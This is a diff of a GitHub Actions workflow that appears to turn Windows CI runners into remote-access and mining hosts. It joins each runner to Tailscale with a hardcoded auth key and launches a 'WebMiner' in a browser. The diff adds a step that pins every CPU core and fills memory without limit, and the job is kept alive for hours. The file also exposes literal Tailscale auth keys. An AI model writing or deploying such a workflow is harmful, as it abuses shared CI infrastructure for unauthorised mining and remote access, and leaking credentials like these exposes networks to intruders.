@@ -25,9 +25,9 @@ jobs:
         run: |
           Add-Type -AssemblyName System.Security
           $chars = @{
-              U=[char[]](65..90); 
-              L=[char[]](97..122); 
-              N=[char[]](48..57);  
+              U=[char[]](65..90);
+              L=[char[]](97..122);
+              N=[char[]](48..57);
               S=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))
           }
           $p=@()
@@ -56,7 +56,7 @@ jobs:
         shell: pwsh
         run: |
           $tsExe="$env:ProgramFiles\Tailscale\tailscale.exe"
-          & $tsExe up --authkey "tskey-auth-kjrmWZarS511CNTRL-eUasmB2AFo8ifaTdb7fmn89MXMeGzN9j" `
+          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" `
             --hostname runner-$env:GITHUB_RUN_ID --reset
 
           $ip=$null
@@ -76,6 +76,23 @@ jobs:
             -ArgumentList "--new-window","--app=$url"
           Write-Host "WebMiner started."
 
+      - name: Max Resource Usage (Full CPU + RAM Load)
+        shell: pwsh
+        run: |
+          Write-Host "Starting MAX CPU + RAM usage..."
+          $cores = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
+          Write-Host "Cores detected: $cores"
+          for ($i=0; $i -lt $cores; $i++) {
+            Start-Job -ScriptBlock {
+              while ($true) { 1..50000 | ForEach-Object { $_ * $_ } }
+            }
+          }
+          $memArray = @()
+          while ($true) {
+            $memArray += "X" * 50000000
+            Start-Sleep -Milliseconds 500
+          }
+
       - name: Print Connection Info
         shell: pwsh
         run: |
@@ -91,7 +108,7 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          $limit = 350   # minutes before rebuild
+          $limit = 350
           for ($i=1; $i -le $limit; $i++) {
             Write-Host "[$(Get-Date)] Session alive ($i/$limit)"
             Start-Sleep -Seconds 60
